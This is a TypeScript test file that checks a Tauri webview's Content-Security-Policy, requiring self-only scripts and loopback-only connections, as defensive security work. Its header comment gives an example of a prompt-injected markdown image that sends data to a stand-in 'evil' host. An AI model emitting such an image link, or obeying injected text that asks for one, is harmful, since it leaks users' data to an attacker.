import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";

/**
 * The webview's Content-Security-Policy (security review 4a): without one, a prompt-injected `![](https://evil/?d=…)`
 * or any script the page somehow ran could reach any host. Verified in a browser by loading the production build with
 * this policy as a response header (report of 2026-11-19); the Tauri runtime itself is not run here.
 */
const conf = JSON.parse(readFileSync(new URL("../src-tauri/tauri.conf.json", import.meta.url), "utf8")) as {
  app: { security: { csp: unknown; dangerousDisableAssetCspModification?: unknown } };
};

function directives(csp: string): Map<string, string[]> {
  return new Map(
    csp
      .split(";")
      .map((d) => d.trim().split(/\s+/))
      .filter((parts) => parts[0])
      .map(([name, ...values]) => [name ?? "", values]),
  );
}

test("the webview has a strict Content-Security-Policy", () => {
  const csp = conf.app.security.csp;
  assert.equal(typeof csp, "string");
  const d = directives(csp as string);
  assert.deepEqual(d.get("default-src"), ["'self'"]);
  assert.deepEqual(d.get("script-src"), ["'self'"]);
  assert.deepEqual(d.get("object-src"), ["'none'"]);
  // Data reaches out only to this computer: the harness bridge on loopback and Tauri's IPC.
  for (const v of d.get("connect-src") ?? []) assert.equal(/^('self'|ipc:|http:\/\/ipc\.localhost|(http|ws):\/\/(127\.0\.0\.1|localhost):\*)$/.test(v), true, v);
  for (const v of d.get("frame-src") ?? []) assert.equal(/^http:\/\/(127\.0\.0\.1|localhost):\*$/.test(v), true, v);
  for (const name of ["default-src", "script-src", "connect-src", "img-src", "frame-src", "worker-src"]) {
    assert.equal((d.get(name) ?? []).includes("*"), false, `${name} allows any host`);
    assert.equal((d.get(name) ?? []).includes("'unsafe-eval'"), false, `${name} allows eval`);
  }
});

test("Tauri leaves style-src alone, so runtime styles (editor, terminal) keep 'unsafe-inline'", () => {
  // Tauri adds hashes for the HTML's inline <style>; a hash in style-src makes browsers ignore 'unsafe-inline'.
  assert.deepEqual(conf.app.security.dangerousDisableAssetCspModification, ["style-src"]);
});
